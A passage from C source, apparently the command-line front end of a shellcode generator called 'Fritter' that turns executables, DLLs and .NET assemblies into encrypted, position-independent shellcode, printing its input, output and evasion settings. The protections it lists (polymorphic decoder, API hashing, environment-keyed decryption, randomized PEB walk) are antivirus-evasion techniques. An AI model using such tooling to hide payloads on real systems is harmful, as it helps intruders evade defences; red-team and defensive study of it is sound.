        printf("    Exec Guard  " C_WHT "Dispatch shim (per-fn XOR)" C_RST "\n");
        printf("    Decoder     " C_WHT "Polymorphic XOR" C_RST "\n");
        printf("    PEB Access  " C_WHT "TEB-indirect (gs:0x30+0x60)" C_RST "\n");
        if(c.decoy[0]) printf("    Decoy       " C_WHT "%s" C_RST "\n", c.decoy);
        if(c.tls_donor[0]) printf("    TLS donor   " C_WHT "%s" C_RST "\n", c.tls_donor);
        {
          int kb = (c.entropy != FRITTER_ENTROPY_DEFAULT || c.key_brute < 0) ? 0 : (c.key_brute ? c.key_brute : FRITTER_KEY_BRUTE_DEFAULT), ki;
          if(kb) printf("    Key         %s%d bits found by trial at load%s\n", C_WHT, kb, C_RST);
          for(ki = 0; ki < 4; ki++) if(c.key_env[ki][0]) printf("    Key         %sonly where %s%s\n", C_WHT, c.key_env[ki], C_RST);
        }
        printf("    PEB Walk    " C_WHT "Randomized" C_RST "\n");
        printf("    Entry Stub  " C_WHT "Randomized" C_RST "\n");
        printf("    Padding     " C_WHT "Randomized" C_RST "\n");
      } else {
        printf("  SUCCESS: Shellcode generated.\n\n");

        printf("  INPUT\n");
        printf("    File        %s\n", c.input);
        printf("    Type        %s\n", mod_type);
        printf("    Compressed  aPLib (-%"PRId32"%%)\n", file_diff(c.zlen, c.len));
        if(c.mod_type == FRITTER_MODULE_NET_DLL) {
          printf("    Class       %s\n", c.cls);
          printf("    Method      %s\n", c.method);
          printf("    Domain      %s\n", c.domain[0] ? c.domain : "Default");
        } else if(c.mod_type == FRITTER_MODULE_DLL) {
          printf("    Function    %s\n", c.method[0] ? c.method : "DllMain");
        }
        if(c.args[0]) printf("    Arguments   %s\n", c.args);
        printf("\n");

        printf("  OUTPUT\n");
        printf("    Shellcode   %s\n", c.output);
        printf("    Instance    Embedded\n");
        printf("    Arch        %s\n", arch_str);
        printf("    Exit        %s\n", exit_str);
        if(c.oep) printf("    OEP         0x%"PRIX32"\n", c.oep);
        printf("\n");

        printf("  PROTECTIONS\n");
        printf("    Encryption  Custom ARX (Chaskey-derived, CTR mode)\n");
        printf("    API Hashing Maru\n");
        printf("    PE Headers  %s\n", headers_str);
        printf("    Exec Guard  Dispatch shim (per-fn XOR)\n");
        printf("    Decoder     Polymorphic XOR\n");
        printf("    PEB Access  TEB-indirect (gs:0x30+0x60)\n");
        if(c.decoy[0]) printf("    Decoy       %s\n", c.decoy);
        if(c.tls_donor[0]) printf("    TLS donor   %s\n", c.tls_donor);
        {
          int kb = (c.entropy != FRITTER_ENTROPY_DEFAULT || c.key_brute < 0) ? 0 : (c.key_brute ? c.key_brute : FRITTER_KEY_BRUTE_DEFAULT), ki;
          if(kb) printf("    Key         %s%d bits found by trial at load%s\n", "", kb, "");
          for(ki = 0; ki < 4; ki++) if(c.key_env[ki][0]) printf("    Key         %sonly where %s%s\n", "", c.key_env[ki], "");
        }
        printf("    PEB Walk    Randomized\n");
        printf("    Entry Stub  Randomized\n");
        printf("    Padding     Randomized\n");
      }
    }
    printf("\n");
    FritterDelete(&c);
    return 0;
}
#endif

